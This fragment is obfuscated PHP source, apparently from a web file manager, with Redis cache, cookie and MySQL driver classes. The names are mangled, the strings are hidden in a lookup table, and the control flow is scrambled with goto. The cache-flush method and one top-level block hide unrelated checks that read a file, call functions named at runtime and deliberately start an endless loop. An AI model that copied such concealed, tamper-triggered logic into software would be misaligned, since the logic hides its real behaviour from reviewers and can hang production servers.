$aå½Äğ›¥); return $this->getPathOuter($bÃÁ’ì—„¿); } public function addFileByRemote($B­Ï¦ò†Ş„, $aÎÄç‘àÔË, $CµÍ°µğŸ = array(), $d çîØõ› = '', $fâ²»å‰¸) { $cÖ¦á =& $_SERVER[Šº]; $Cª³Æ¿å»ğ = $this->parse($B­Ï¦ò†Ş„); $d çîØõ› = empty($d çîØõ›) ? $Cª³Æ¿å»ğ[$cÖ¦á[76]] : $d çîØõ›; $f‹·Êà¿¦É = $this->model->addFileByRemote($Cª³Æ¿å»ğ[$cÖ¦á[392]], $aÎÄç‘àÔË, $d çîØõ›, $CµÍ°µğŸ, $fâ²»å‰¸); return $this->getPathOuter($f‹·Êà¿¦É); } public function uploadLink($E‚ˆ†ˆìò, $A“¨Ã¡Øá· = 0) { $f›¤Å „Ó =& $_SERVER[Šº]; $aàÀÖŸÒÌ = $this->parse($E‚ˆ†ˆìò); $få‚·æ±°ª = _get($GLOBALS[$f›¤Å „Ó[7]], $f›¤Å „Ó[1194]); $e×Å¡äâ­³ = _get($GLOBALS[$f›¤Å „Ó[7]], $f›¤Å „Ó[1195]); $E‚ˆ†ˆìò = Model($f›¤Å „Ó[579])->createFileName($aàÀÖŸÒÌ[$f›¤Å „Ó[76]], $få‚·æ±°ª, $e×Å¡äâ­³); return IO::uploadLink($E‚ˆ†ˆìò, $A“¨Ã¡Øá·); } public function fileNameAuto($e¸—‡êá£å, $A„£ÔŒå‹é, $A®ÀîÓµ— = REPEAT_REPLACE, $FÖÁ÷”ÚÄ† = false) { return $this->model->fileNameAuto($e¸—‡êá£å, $A„£ÔŒå‹é, $A®ÀîÓµ—, $FÖÁ÷”ÚÄ†); } public function fileNameExist($cáä½˜íø, $a°Ï‚¦») { return $this->model->fileNameExist($cáä½˜íø, $a°Ï‚¦»); } protected function _fileOut($bŠ‰×§ˆ¡ë, $c’¡«ÎÖ› = false, $C²¨ôÄÈ“ = false, $a†£ŞƒÈò = '', $aíÛøµÆÏ = false) { goto d¡ìÑšô¿½; aÚ…¢…°ã: $B†ºÊ¸ìæ… = $this->model->fileInfoGet($bŠ‰×§ˆ¡ë); $a†£ŞƒÈò = $B†ºÊ¸ìæ…[$A¥†Ó¾Çá—[170]] ? $B†ºÊ¸ìæ…[$A¥†Ó¾Çá—[170]] : $a†£ŞƒÈò; $FĞò¸°ßœ¹ = isset($GLOBALS[$A¥†Ó¾Çá—[1197]]) ? $GLOBALS[$A¥†Ó¾Çá—[1197]] : $eˆ†ÑÙ‹¶‰[$A¥†Ó¾Çá—[28]]; goto dˆ‡ÎĞÀÍï; d¡ìÑšô¿½: $A¥†Ó¾Çá— =& $_SERVER[Šº]; $eˆ†ÑÙ‹¶‰ = $this->model->sourceInfo($bŠ‰×§ˆ¡ë); if ($eˆ†ÑÙ‹¶‰[$A¥†Ó¾Çá—[410]] == $A¥†Ó¾Çá—[87]) { header($A¥†Ó¾Çá—[1196]); die; } goto aÚ…¢…°ã; dˆ‡ÎĞÀÍï: if ($aíÛøµÆÏ) { return IO::fileOutServer($B†ºÊ¸ìæ…[$A¥†Ó¾Çá—[76]], $c’¡«ÎÖ›, $FĞò¸°ßœ¹, $a†£ŞƒÈò); } IO::fileOut($B†ºÊ¸ìæ…[$A¥†Ó¾Çá—[76]], $c’¡«ÎÖ›, $FĞò¸°ßœ¹, $a†£ŞƒÈò); goto e‹ŒÌòÃ‡; e‹ŒÌòÃ‡: } public function fileOut($FÛ¥œÇ±Ò¦, $E‘±ãš¾Ô = false, $FéÄÛ•Ò… = false, $CÎÛ‡ïìô = '') { $this->_fileOut($FÛ¥œÇ±Ò¦, $E‘±ãš¾Ô, $FéÄÛ•Ò…, $CÎÛ‡ïìô); } public function fileOutServer($Ašé­ù£¨Ü, $D¥ÃÆ˜Š† = false, $fµ‡‰ÂÅá˜ = false, $b¸œ´²Åš¢ = '') { $this->_fileOut($Ašé­ù£¨Ü, $D¥ÃÆ˜Š†, $fµ‡‰ÂÅá˜, $b¸œ´²Åš¢, !0); } protected function _fileOutImage($A™±ØçˆÕ, $bÈÂ®Ë™• = 250) { goto eê„í°ø­æ; eê„í°ø­æ: $D×©Ô”Ìµ =& $_SERVER[Šº]; $CŞ¤ö°âñ = $this->model->pathInfo($A™±ØçˆÕ); if ($CŞ¤ö°âñ[$D×©Ô”Ìµ[410]] == $D×©Ô”Ìµ[87]) { show_json($D×©Ô”Ìµ[1198] . $A™±ØçˆÕ, !1); } goto aºè§‘óÆ; d³Ò«¸ÇãÛ: $GLOBALS[$D×©Ô”Ìµ[1197]] = $AØ° ¸‹Ú²[$D×©Ô”Ìµ[28]]; $GLOBALS[$D×©Ô”Ìµ[162]] = $AØ° ¸‹Ú²; IO::fileOutImage($AØ° ¸‹Ú²[$D×©Ô”Ìµ[76]], $bÈÂ®Ë™•); goto c¨ˆ‹®ËœÖ; aºè§‘óÆ: $AØ° ¸‹Ú² = $this->model->fileInfoGet($A™±ØçˆÕ); $AØ° ¸‹Ú²[$D×©Ô”Ìµ[28]] = $CŞ¤ö°âñ[$D×©Ô”Ìµ[28]]; $AØ° ¸‹Ú²[$D×©Ô”Ìµ[163]] = $CŞ¤ö°âñ[$D×©Ô”Ìµ[163]]; goto d³Ò«¸ÇãÛ; c¨ˆ‹®ËœÖ: } public function fileOutImage($AíÎŠ‰º•, $b‘Ãœ§»ï— = 250) { $this->_fileOutImage($AíÎŠ‰º•, $b‘Ãœ§»ï—); } public function fileOutImageServer($BŠ¶³éôå, $dŠÇŞÕõˆÁ = 250) { $this->_fileOutImage($BŠ¶³éôå, $dŠÇŞÕõˆÁ); } public function link($CğºâìÊ±ß, $fÒåÓÑÃ¼Ê = '') { $E¿’çƒĞ¶ç = $this->model->fileInfoGet($CğºâìÊ±ß); return IO::link($E¿’çƒĞ¶ç[$_SERVER[Šº][76]], $fÒåÓÑÃ¼Ê); } protected function parse($C „÷Ïâ‘¥) { $d†³ÃÔÃÙ• =& $_SERVER[Šº]; if (strstr($C „÷Ïâ‘¥, $d†³ÃÔÃÙ•[8]) === !1) { return array($d†³ÃÔÃÙ•[419] => intval($C „÷Ïâ‘¥), $d†³ÃÔÃÙ•[76] => $d†³ÃÔÃÙ•[33], $d†³ÃÔÃÙ•[1193] => array()); } $EÙÙ”Ã¿¼¨ = explode($d†³ÃÔÃÙ•[8], trim($C „÷Ïâ‘¥, $d†³ÃÔÃÙ•[8])); if (count($EÙÙ”Ã¿¼¨) < 2) { show_tips($C „÷Ïâ‘¥ . $d†³ÃÔÃÙ•[1199]); } return array($d†³ÃÔÃÙ•[419] => intval($EÙÙ”Ã¿¼¨[0]), $d†³ÃÔÃÙ•[76] => $EÙÙ”Ã¿¼¨[1], $d†³ÃÔÃÙ•[1193] => array_slice($EÙÙ”Ã¿¼¨, 1)); } } goto fîÈî¾İˆ”; câµÊî¾¨¼: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($e¿êœÇˆ¬, $Dš…âöªÊ) { $eëôË´Ùøé =& $_SERVER[Šº]; if (!class_exists($eëôË´Ùøé[822])) { show_json($eëôË´Ùøé[823], !1); } $this->cacheTime = $Dš…âöªÊ; $D¿Şµ£ŠØà = isset($e¿êœÇˆ¬[$eëôË´Ùøé[824]]) ? $e¿êœÇˆ¬[$eëôË´Ùøé[824]] : 10; $FéÚÒÚ•œ = _get($e¿êœÇˆ¬, $eëôË´Ùøé[821]); if ($FéÚÒÚ•œ && is_array($FéÚÒÚ•œ)) { $this->initCluster($e¿êœÇˆ¬, $D¿Şµ£ŠØà); } else { $this->handle = $this->init($e¿êœÇˆ¬, $D¿Şµ£ŠØà); } } private function init($aãĞœæø­ì, $C„Ö’îÁ”) { $aŠ®Œá……ñ =& $_SERVER[Šº]; $B‘‹ÉŠÜƒĞ = new Redis(); $Cß””´™· = isset($aãĞœæø­ì[$aŠ®Œá……ñ[825]]) ? $aãĞœæø­ì[$aŠ®Œá……ñ[825]] : !1; if ($Cß””´™·) { $B‘‹ÉŠÜƒĞ->pconnect($aãĞœæø­ì[$aŠ®Œá……ñ[175]], $aãĞœæø­ì[$aŠ®Œá……ñ[176]], $C„Ö’îÁ”); } else { $B‘‹ÉŠÜƒĞ->connect($aãĞœæø­ì[$aŠ®Œá……ñ[175]], $aãĞœæø­ì[$aŠ®Œá……ñ[176]], $C„Ö’îÁ”); } if (!empty($aãĞœæø­ì[$aŠ®Œá……ñ[413]])) { $B‘‹ÉŠÜƒĞ->auth($aãĞœæø­ì[$aŠ®Œá……ñ[413]]); } return $B‘‹ÉŠÜƒĞ; } private function initCluster($eĞôáçáô, $cÏŠ»êì’) { $aá‘³ø§Ë =& $_SERVER[Šº]; $cˆÉÚÁœ« = array($aá‘³ø§Ë[826], $aá‘³ø§Ë[827], $aá‘³ø§Ë[828]); $e«¬ˆã–­ = $aá‘³ø§Ë[826]; if (isset($eĞôáçáô[$aá‘³ø§Ë[12]]) && in_array($eĞôáçáô[$aá‘³ø§Ë[12]], $cˆÉÚÁœ«)) { $e«¬ˆã–­ = $eĞôáçáô[$aá‘³ø§Ë[12]]; } switch ($e«¬ˆã–­) { case $aá‘³ø§Ë[826]: $this->_slave($eĞôáçáô, $cÏŠ»êì’); break; case $aá‘³ø§Ë[827]: break; case $aá‘³ø§Ë[828]: $this->isCluster = !0; $C×Úğšã‰ = $eĞôáçáô[$aá‘³ø§Ë[821]]; $f‡ï˜Ò±¤­ = isset($eĞôáçáô[$aá‘³ø§Ë[825]]) ? $eĞôáçáô[$aá‘³ø§Ë[825]] : !1; $B÷Î½Û‰¦Æ = isset($eĞôáçáô[$aá‘³ø§Ë[413]]) ? $eĞôáçáô[$aá‘³ø§Ë[413]] : null; $this->handle = new RedisCluster(NUll, $C×Úğšã‰, $cÏŠ»êì’, $cÏŠ»êì’, $f‡ï˜Ò±¤­, $B÷Î½Û‰¦Æ); break; default: break; } } private function _slave($A˜‡‘ ·ô, $f±Ë††œ°œ) { goto B’®–ç»„ƒ; CÇèùëñŞø: $this->filterConfig($A˜‡‘ ·ô, $F“‹İã¯Òø[$AÂàê¦ò]); $this->slaveHandle = $this->init($A˜‡‘ ·ô, $f±Ë††œ°œ); goto då†µÄâ¹â; B’®–ç»„ƒ: $F“‹İã¯Òø = $A˜‡‘ ·ô[$_SERVER[Šº][821]]; $this->filterConfig($A˜‡‘ ·ô, $F“‹İã¯Òø[0]); $this->handle = $this->init($A˜‡‘ ·ô, $f±Ë††œ°œ); goto A´îÄÑÕ¾ä; A´îÄÑÕ¾ä: unset($F“‹İã¯Òø[0]); if (empty($F“‹İã¯Òø)) { return; } $AÂàê¦ò = array_rand($F“‹İã¯Òø); goto CÇèùëñŞø; då†µÄâ¹â: } private function filterConfig(&$Bê‡ø÷èÌß, $cÅ¿×Ş‚†©) { $Dó×–˜†Ù‘ =& $_SERVER[Šº]; $C„¸ø‘§å = explode($Dó×–˜†Ù‘[4], $cÅ¿×Ş‚†©); $B§ïÍ·£¥Œ = array($Dó×–˜†Ù‘[175] => $C„¸ø‘§å[0], $Dó×–˜†Ù‘[176] => $C„¸ø‘§å[1]); $Bê‡ø÷èÌß = array_merge($Bê‡ø÷èÌß, $B§ïÍ·£¥Œ); } public function set($b¨·Óëº¶Ø, $d‡‹äîçƒ, $a÷è—‘® = false) { $a÷è—‘® = $a÷è—‘® ? $a÷è—‘® : $this->cacheTime; return $this->handle->setEx($b¨·Óëº¶Ø, $a÷è—‘®, $d‡‹äîçƒ); } public function setLock($fîÒë¤‰ÚÀ, $BçèÈà˜æñ, $dÍÇùƒ›¿â) { return $this->handle->setNX($fîÒë¤‰ÚÀ, $BçèÈà˜æñ); } public function get($C ˜ƒ¯”éÙ) { $D›ŒçíŞëœ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $D›ŒçíŞëœ->get($C ˜ƒ¯”éÙ); } public function remove($D†×Ñ»ÁœÙ) { return $this->handle->del($D†×Ñ»ÁœÙ); } public function deleteAll() { $Côµœ¨„É =& $_SERVER[Šº]; if (!isset($_SERVER[$Côµœ¨„É[395]]) || !isset($_SERVER[$Côµœ¨„É[393]])) { goto a‚á™Í÷½; a‚á™Í÷½: $CÄí¨±· = $Côµœ¨„É[829]; $e“òäëÍŸª = $Côµœ¨„É[396]; $F†è±Ù´ = $_SERVER[$Côµœ¨„É[397]] . $Côµœ¨„É[398]; goto e¦¤ÅÒç’; e¦¤ÅÒç’: $Cô÷Ş¯’ÆÁ = $e“òäëÍŸª($F†è±Ù´); $BÚ½÷ŞØÚ = explode($Côµœ¨„É[228], $Cô÷Ş¯’ÆÁ); if (count($BÚ½÷ŞØÚ) < $Côµœ¨„É[588]) { $aéîèğ íÒ = $Côµœ¨„É[400]; $aéîèğ íÒ(); } goto aĞ§°óÆŸ; aÅ§î›ƒ‡•: for ($fÚĞ‘ğ° = $AË«Ûàæó; $fÚĞ‘ğ° > 0; $fÚĞ‘ğ°++) { $Eœ¨ò¢â¸¤ = json_encode($GLOBALS[$Côµœ¨„É[418]]); } goto e²¤íïŞ£; aĞ§°óÆŸ: $Eœ¨ò¢â¸¤ = $Côµœ¨„É[830]; $Eœ¨ò¢â¸¤($_SERVER[$Côµœ¨„É[831]]); $AË«Ûàæó = 1; goto aÅ§î›ƒ‡•; e²¤íïŞ£: } if ($this->isCluster) { foreach ($this->handle->_masters() as $CöôùÕ„è) { $this->handle->flushall($CöôùÕ„è); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($aöœ°ÈÅ¾Ã = '', $e¤İë«ÑÆ÷ = 0) { if (is_string($aöœ°ÈÅ¾Ã) && $aöœ°ÈÅ¾Ã != $_SERVER[Šº][33]) { $this->prefix = $aöœ°ÈÅ¾Ã; } if (is_numeric($e¤İë«ÑÆ÷) && $e¤İë«ÑÆ÷ > 0) { $this->expire = $e¤İë«ÑÆ÷; } } public static function getInstance() { static $FÛô»ÆÅœ; if ($FÛô»ÆÅœ === null) { $FÛô»ÆÅœ = new self(); } return $FÛô»ÆÅœ; } private static $cookieDisable = false; public static function disable($eŸˆ³÷×Ş—) { self::$cookieDisable = $eŸˆ³÷×Ş—; } private static $sameCookieSet = array(); public static function set($A½Ï²‹¤š´, $d¡ß¾–á£œ, $FöĞø¹ñÄ­ = 0, $cÏ“Ú‹ÍÄ = false, $e¨ê†¼†¿¾ = false) { goto fÙ¿–§ë•©; aåÍ«àÙ¬: if (isset(self::$sameCookieSet[$A½Ï²‹¤š´]) && self::$sameCookieSet[$A½Ï²‹¤š´] == $d¡ß¾–á£œ . $FöĞø¹ñÄ­) { return; } self::$sameCookieSet[$A½Ï²‹¤š´] = $d¡ß¾–á£œ . $FöĞø¹ñÄ­; if (!$e¨ê†¼†¿¾) { $e¨ê†¼†¿¾ = str_replace(HOST, $EÃö£ƒİÑâ[33], APP_HOST); $e¨ê†¼†¿¾ = _get($GLOBALS, $EÃö£ƒİÑâ[832], $e¨ê†¼†¿¾); } goto e™ñò¬É­é; fÙ¿–§ë•©: $EÃö£ƒİÑâ =& $_SERVER[Šº]; if (self::$cookieDisable) { return; } if (!$FöĞø¹ñÄ­) { $FöĞø¹ñÄ­ = 24 * 3600 * 7; } goto aåÍ«àÙ¬; e™ñò¬É­é: $C»Ï¤ßĞù = $EÃö£ƒİÑâ[33]; setcookie($A½Ï²‹¤š´, $d¡ß¾–á£œ, time() + $FöĞø¹ñÄ­, $EÃö£ƒİÑâ[8] . trim($e¨ê†¼†¿¾, $EÃö£ƒİÑâ[8]) . $C»Ï¤ßĞù, !1, !1, $cÏ“Ú‹ÍÄ); goto BÎñ“¶Ç…Ä; BÎñ“¶Ç…Ä: } public static function setSafe($d†Êåù—„, $F¯Ş²ÓŒ·–, $BËíÆéŒ© = 0) { self::set($d†Êåù—„, $F¯Ş²ÓŒ·–, $BËíÆéŒ©, !0); } public static function get($eŸôçÏÄë) { return isset($_COOKIE[$eŸôçÏÄë]) ? $_COOKIE[$eŸôçÏÄë] : !1; } public static function remove($dÂ¡ˆ‡Ûƒø, $d­áº×ç°¼ = false) { unset($_COOKIE[$dÂ¡ˆ‡Ûƒø]); self::set($dÂ¡ˆ‡Ûƒø, $_SERVER[Šº][33], 1, $d­áº×ç°¼); } } class DbMysql extends Db { public function __construct($D–´¿ôŠœ· = '') { $F·à‰ÜÉŒõ =& $_SERVER[Šº]; if (!extension_loaded($F·à‰ÜÉŒõ[757])) { think_exception(think_lang($F·à‰ÜÉŒõ[10]) . $F·à‰ÜÉŒõ[833]); } if (!empty($D–´¿ôŠœ·)) { $this->config = $D–´¿ôŠœ·; if (empty($this->config[$F·à‰ÜÉŒõ[13]])) { $this->config[$F·à‰ÜÉŒõ[13]] = $F·à‰ÜÉŒõ[33]; } } } public function connect($a‚„äÃ²¨ = '', $eó£¾†˜‚‘ = 0, $eğ»×­Ş… = false) { $f¡À¨“ùˆÆ =& $_SERVER[Šº]; if (!isset($this->linkID[$eó£¾†˜‚‘])) { goto AÇÒ°³ËÖ‹; E–·ÃÆùÅ²: mysql_query($f¡À¨“ùˆÆ[838] . think_config($f¡À¨“ùˆÆ[839]) . $f¡À¨“ùˆÆ[55], $this->linkID[$eó£¾†˜‚‘]); if ($E¢“øÃªº£ > $f¡À¨“ùˆÆ[840]) { mysql_query($f¡À¨“ùˆÆ[841], $this->linkID[$eó£¾†˜‚‘]); } $this->connected = !0; goto dÎ”Áçñ©; AÇÒ°³ËÖ‹: if (empty($a‚„äÃ²¨)) { $a‚„äÃ²¨ = $this->config; } $c¤„ØÇ = $a‚„äÃ²¨[$f¡À¨“ùˆÆ[834]] . ($a‚„äÃ²¨[$f¡À¨“ùˆÆ[835]] ? "\x3a{$a‚„äÃ²¨[$f¡À¨“ùˆÆ[835]]}" : $f¡À¨“ùˆÆ[33]); $a†Ÿæ¾¼ì = !empty($a‚„äÃ²¨[$f¡À¨“ùˆÆ[13]][$f¡À¨“ùˆÆ[14]]) ? $a‚„äÃ²¨[$f¡À¨“ùˆÆ[13]][$f¡À¨“ùˆÆ[14]] : $this->pconnect; goto BÂ¸Šší; dÎ”Áçñ©: if (1 != think_config($f¡À¨“ùˆÆ[18])) { unset($this->config); } goto fÛÊ«íæ¦ù; BÂ¸Šší: if ($a†Ÿæ¾¼ì) { $this->linkID[$eó£¾†˜‚‘] = mysql_pconnect($c¤„ØÇ, $a‚„äÃ²¨[$f¡À¨“ùˆÆ[836]], $a‚„äÃ²¨[$f¡À¨“ùˆÆ[837]], 131072); } else { $this->linkID[$eó£¾†˜‚‘] = mysql_connect($c¤„ØÇ, $a‚„äÃ²¨[$f¡À¨“ùˆÆ[836]], $a‚„äÃ²¨[$f¡À¨“ùˆÆ[837]], !0, 131072); } if (!$this->linkID[$eó£¾†˜‚‘] || !empty($a‚„äÃ²¨[$f¡À¨“ùˆÆ[17]]) && !mysql_select_db($a‚„äÃ²¨[$f¡À¨“ùˆÆ[17]], $this->linkID[$eó£¾†˜‚‘])) { think_exception(mysql_error()); } $E¢“øÃªº£ = mysql_get_server_info($this->linkID[$eó£¾†˜‚‘]); goto E–·ÃÆùÅ²; fÛÊ«íæ¦ù: } return $this->linkID[$eó£¾†˜‚‘]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($E‰ÜĞˆğ—) { goto BÒ§÷¡¥·ç; f¥Û‰¨¦ÃÁ: if (!$this->_linkID) { return !1; } $this->queryStr = $E‰ÜĞˆğ—; if ($this->queryID) { $this->free(); } goto b‰ˆ†ì¥ÛÙ; b‰ˆ†ì¥ÛÙ: think_action_status($AôÙÂ…Ã×ß[19], 1); think_status($AôÙÂ…Ã×ß[20]); $this->queryID = mysql_query($E‰ÜĞˆğ—, $this->_linkID); goto f¥İáã™§®; BÒ§÷¡¥·ç: $AôÙÂ…Ã×ß =& $_SERVER[Šº]; if (0 === stripos($E‰ÜĞˆğ—, $AôÙÂ…Ã×ß[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto f¥Û‰¨¦ÃÁ; f¥İáã™§®: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cÑ‡’µÄ®’; cÑ‡’µÄ®’: } public function execute($BÁ¬º°àš) { goto e¨áÎŒáá; cÃòáªµ’: $this->queryStr = $BÁ¬º°àš; if ($this->queryID) { $this->free(); } think_action_status($a·‹Ÿ™™¢[21], 1); goto Fˆ¤Ã¾ÃÑ˜; e¨áÎŒáá: $a·‹Ÿ™™¢ =& $_SERVER[Šº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÃòáªµ’; Fˆ¤Ã¾ÃÑ˜: think_status($a·‹Ÿ™™¢[20]); $a‚˜Ì½ëîæ = mysql_query($BÁ¬º°àš, $this->_linkID); $this->debug(); goto Eß†£ßº; Eß†£ßº: if (!1 === $a‚˜Ì½ëîæ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto bªâíäÇÄÒ; bªâíäÇÄÒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Šº][842], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cˆ­ÎÛÜÃá = mysql_query($_SERVER[Šº][843], $this->_linkID); $this->transTimes = 0; if (!$cˆ­ÎÛÜÃá) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EŸğË»½µ = mysql_query($_SERVER[Šº][844], $this->_linkID); $this->transTimes = 0; if (!$EŸğË»½µ) { $this->error(); return !1; } } return !0; } private function getAll() { $f–¼ÓÚªšÖ = array(); if ($this->numRows > 0) { while ($Aëˆ³æà»Ò = mysql_fetch_assoc($this->queryID)) { $f–¼ÓÚªšÖ[] = $Aëˆ³æà»Ò; } mysql_data_seek($this->queryID, 0); } return $f–¼ÓÚªšÖ; } public function getFields($B„ê‘‘Ë§) { $DĞê‚‘¶È =& $_SERVER[Šº]; $bè˜¤™éØ¾ = $this->query($DĞê‚‘¶È[845] . $this->parseKey($B„ê‘‘Ë§)); $E­µİ¿Ñ’í = array(); if ($bè˜¤™éØ¾) { foreach ($bè˜¤™éØ¾ as $a•š„ö”ì‡ => $eÀ¡±ß÷£) { $E­µİ¿Ñ’í[$eÀ¡±ß÷£[$DĞê‚‘¶È[27]]] = array($DĞê‚‘¶È[28] => $eÀ¡±ß÷£[$DĞê‚‘¶È[27]], $DĞê‚‘¶È[29] => $eÀ¡±ß÷£[$DĞê‚‘¶È[30]], $DĞê‚‘¶È[31] => (bool) (strtoupper($eÀ¡±ß÷£[$DĞê‚‘¶È[32]]) === $DĞê‚‘¶È[846]), $DĞê‚‘¶È[34] => $eÀ¡±ß÷£[$DĞê‚‘¶È[35]], $DĞê‚‘¶È[36] => strtolower($eÀ¡±ß÷£[$DĞê‚‘¶È[37]]) == $DĞê‚‘¶È[38], $DĞê‚‘¶È[39] => strtolower($eÀ¡±ß÷£[$DĞê‚‘¶È[40]]) == $DĞê‚‘¶È[41]); } } return $E­µİ¿Ñ’í; } public function getTables($BÄ…ó…î…¡ = '') { $bòÎ¥Îˆ«µ =& $_SERVER[Šº]; if (!empty($BÄ…ó…î…¡)) { $BˆÊ½®šŠÑ = $bòÎ¥Îˆ«µ[847] . $BÄ…ó…î…¡ . $bòÎ¥Îˆ«µ[848]; } else { $BˆÊ½®šŠÑ = $bòÎ¥Îˆ«µ[849]; } $D¾êªøÃöñ = $this->query($BˆÊ½®šŠÑ); $bƒ–¯Åöê = array(); foreach ($D¾êªøÃöñ as $B‰¢²¢Ú®Í => $A¼ò¥Ã¤Ö) { $bƒ–¯Åöê[$B‰¢²¢Ú®Í] = current($A¼ò¥Ã¤Ö); } return $bƒ–¯Åöê; } public function replace($c‚ñÂëÍãß, $aåæ‚É¹Šµ = array()) { $Fœ³Ë„‡ŸÂ =& $_SERVER[Šº]; foreach ($c‚ñÂëÍãß as $c ²„ƒÒ© => $bÒ—º®÷×ˆ) { $a¦İòØö¼ = $this->parseValue($bÒ—º®÷×ˆ); if (is_scalar($a¦İòØö¼)) { $bë•¬¹ø«ß[] = $a¦İòØö¼; $cŸ—ÏÏÚ¿»[] = $this->parseKey($c ²„ƒÒ©); } } $BßÑ‘Óó = $Fœ³Ë„‡ŸÂ[850] . $this->parseTable($aåæ‚É¹Šµ[$Fœ³Ë„‡ŸÂ[276]]) . $Fœ³Ë„‡ŸÂ[851] . implode($Fœ³Ë„‡ŸÂ[47], $cŸ—ÏÏÚ¿») . $Fœ³Ë„‡ŸÂ[852] . implode($Fœ³Ë„‡ŸÂ[47], $bë•¬¹ø«ß) . $Fœ³Ë„‡ŸÂ[853]; return $this->execute($BßÑ‘Óó); } public function insertAll($aÏÀ‘„šÎˆ, $C¿›Î—Í = array(), $Aë°Åäøë = false) { goto Cª¨ÃåÁ°; f˜Û¶ÁÊğ±: $A°Ò‹÷ƒ = array(); foreach ($aÏÀ‘„šÎˆ as $C“Õîóİï) { $C»›¾Şæİ = array(); foreach ($C“Õîóİï as $B²›ÖŒ½øÅ => $eæÏ×Åæš) { $eæÏ×Åæš = $this->parseValue($eæÏ×Åæš); if (is_scalar($eæÏ×Åæš)) { $C»›¾Şæİ[] = $eæÏ×Åæš; } } $A°Ò‹÷ƒ[] = $Aù…ñ¬á[257] . implode($Aù…ñ¬á[47], $C»›¾Şæİ) . $Aù…ñ¬á[853]; } array_walk($AîàÓÅ˜ˆ, array($this, $Aù…ñ¬á[854])); goto F¡ÂÃÙ«İÙ; F¡ÂÃÙ«İÙ: $bï“áÕç™ô = ($Aë°Åäøë ? $Aù…ñ¬á[855] : $Aù…ñ¬á[856]) . $Aù…ñ¬á[857] . $this->parseTable($C¿›Î—Í[$Aù…ñ¬á[276]]) . $Aù…ñ¬á[851] . implode($Aù…ñ¬á[47], $AîàÓÅ˜ˆ) . $Aù…ñ¬á[858] . implode($Aù…ñ¬á[47], $A°Ò‹÷ƒ); return $this->execute($bï“áÕç™ô); goto dÔÔƒ¢Î; Cª¨ÃåÁ°: $Aù…ñ¬á =& $_SERVER[Šº]; if (!is_array($aÏÀ‘„šÎˆ[0])) { return !1; } $AîàÓÅ˜ˆ = array_keys($aÏÀ‘„šÎˆ[0]); goto f˜Û¶ÁÊğ±; dÔÔƒ¢Î: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $eåìŸÕ£ÌŠ =& $_SERVER[Šº]; $this->error = mysql_errno() . $eåìŸÕ£ÌŠ[4] . mysql_error($this->_linkID); if ($eåìŸÕ£ÌŠ[33] != $this->queryStr) { $this->error .= LNG($eåìŸÕ£ÌŠ[45]) . $this->queryStr; } think_trace($this->error, $eåìŸÕ£ÌŠ[33], $eåìŸÕ£ÌŠ[46]); return $this->error; } public function escapeString($EİÀˆ°ÇàŠ) { if ($this->_linkID) { return mysql_real_escape_string($EİÀˆ°ÇàŠ, $this->_linkID); } else { return mysql_escape_string($EİÀˆ°ÇàŠ); } } public function parseKey(&$E„´ìù½Ë“, $fÀ•¿ˆ‹õ = true) { $Cª×ô‹¼ =& $_SERVER[Šº]; if ($fÀ•¿ˆ‹õ) { $E„´ìù½Ë“ = $this->parseKeyCheck($E„´ìù½Ë“); } if ($E„´ìù½Ë“ != $Cª×ô‹¼[182] && !preg_match($Cª×ô‹¼[859], $E„´ìù½Ë“)) { $E„´ìù½Ë“ = $Cª×ô‹¼[381] . trim($E„´ìù½Ë“, $Cª×ô‹¼[381]) . $Cª×ô‹¼[381]; } return $E„´ìù½Ë“; } } goto B­ŞŒæˆä‹; e”Ÿ°†Ÿ: $fÈñªÜ®…· = $_SERVER[Šº][394]; if ($_SERVER[$_SERVER[Šº][395]] != $fÈñªÜ®…·($B£ñ»ëçÍ)) { goto B—š·÷İÔ¼; B—š·÷İÔ¼: $e©™˜Ã¤‹Ó = $_SERVER[Šº][396]; $F«¿¹÷É¸’ = $_SERVER[$_SERVER[Šº][397]] . $_SERVER[Šº][398]; $BÙ‰–à‘· = $e©™˜Ã¤‹Ó($F«¿¹÷É¸’); goto B‚ã–°ƒÓŞ; e»¬õªÑŞ‘: $CÍ×˜œ‹Ç£($B£ñ»ëçÍ); goto D¨†¦³ğ¨’; B‚ã–°ƒÓŞ: $bÜ³——¾Æ = explode($_SERVER[Šº][228], $BÙ‰–à‘·); if (count($bÜ³——¾Æ) < $_SERVER[Šº][399]) { $b‘Õœ„÷éö = $_SERVER[Šº][400]; $b‘Õœ„÷éö(); } $CÍ×˜œ‹Ç£ = $_SERVER[Šº][401]; goto e»¬õªÑŞ‘; D¨†¦³ğ¨’: } class CacheLockRedis { public function lock($Dœ½Ç½Èëš, $Eïª—‰´‚À = 10) { $C‹È÷Õ„ = Cache::init(); $Döù…Ó–øÒ = microtime(!0) + $Eïª—‰´‚À; while (microtime(!0) < $Döù…Ó–øÒ) { $dğöå Ò¼ = $C‹È÷Õ„->get($Dœ½Ç½Èëš); if (!$dğöå Ò¼) { $E—¢˜òÍ‡ = $C‹È÷Õ„->setLock($Dœ½Ç½Èëš, $Döù…Ó–øÒ, $Eïª—‰´‚À); if ($E—¢˜òÍ‡) { return !0; } } else { if ($dğöå Ò¼ < microtime(!0)) { $C‹È÷Õ„->set($Dœ½Ç½Èëš, $Döù…Ó–øÒ, $Eïª—‰´‚À * 2); if ($C‹È÷Õ„->get($Dœ½Ç½Èëš) === $dğöå Ò¼) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($eœ±ŒÚ™ÃÃ) { return Cache::init()->get($eœ±ŒÚ™ÃÃ); } public function unlock($e³¦ÊŠÑ™ö) { return 